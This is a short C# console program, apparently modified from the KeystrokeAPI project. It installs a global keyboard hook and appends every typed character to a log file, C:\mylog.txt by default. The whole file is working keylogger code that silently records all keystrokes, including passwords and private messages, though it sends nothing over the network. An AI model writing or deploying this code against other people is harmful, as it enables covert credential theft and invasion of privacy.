// Code from https://github.com/fabriciorissetto/KeystrokeAPI#readme but modified //
using Keystroke.API;
using System;
using System.Windows.Forms;
using System.IO;
namespace ConsoleApplicationTest
{
	class Program
	{
		private static string buffer = "";
		static int Main(string[] args)
		{
			string LOG_FILE_NAME = args.Length >= 1 ? args[0] : @"C:\mylog.txt";
			using (var api = new KeystrokeAPI())
			{
				api.CreateKeyboardHook((character) => {

					StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
					buffer += character;
					output.Write(buffer);
					output.Close();
					//Console.Write(character); Si besoin d'afficher dans la console
					buffer = "";

				});
				Application.Run();
			}
			return 0;
		}
	}
}
